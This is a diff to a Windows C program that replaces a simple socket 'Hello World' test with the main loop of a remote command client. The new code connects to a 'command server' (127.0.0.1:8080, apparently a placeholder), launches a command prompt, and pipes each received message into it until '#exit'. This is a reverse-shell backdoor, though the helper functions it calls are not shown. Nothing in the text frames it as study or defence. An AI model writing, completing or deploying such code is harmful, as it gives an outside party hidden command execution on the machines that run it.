@@ -11,32 +11,17 @@
 	Main function
 */
 int main() {
-	// test code for socket - sends and receives "Hello World!"
-	printf("Running...\n");
+	// initialize WinSock and connect to the command server
 	initWinSock();
 	SOCKET cmdSock = INVALID_SOCKET;
 	connectTCP("127.0.0.1", 8080, &cmdSock);
-	printf("Connected!\n");
-	int res;
-	char* msg = "Hello World!";
-	res = send(cmdSock, msg, strlen(msg), 0);
-	if (res == SOCKET_ERROR) {
-		printf("send failed with error %d\n", WSAGetLastError());
-		closesocket(cmdSock);
-		WSACleanup();
-		return;
-	}
-	printf("Sent info!\n");
+	// spawn a command prompt and the associated threads
+	startCMD(cmdSock);
+	// main program loop
 	char buff[4096];
-	ZeroMemory(buff, 4096);
-	res = recv(cmdSock, buff, 4096, 0);
-	if (res == SOCKET_ERROR) {
-		printf("recv failed with error %d\n", WSAGetLastError());
-		closesocket(cmdSock);
-		WSACleanup();
-		return;
+	int res = recv(cmdSock, buff, 4096, 0);
+	while (res != SOCKET_ERROR && strcmp(buff, "#exit") != 0) {
+		inputToCMD(buff, strlen(buff));
+		res = recv(cmdSock, buff, 4096, 0);
 	}
-	printf("%s", buff);
-	closesocket(cmdSock);
-	WSACleanup();
 }
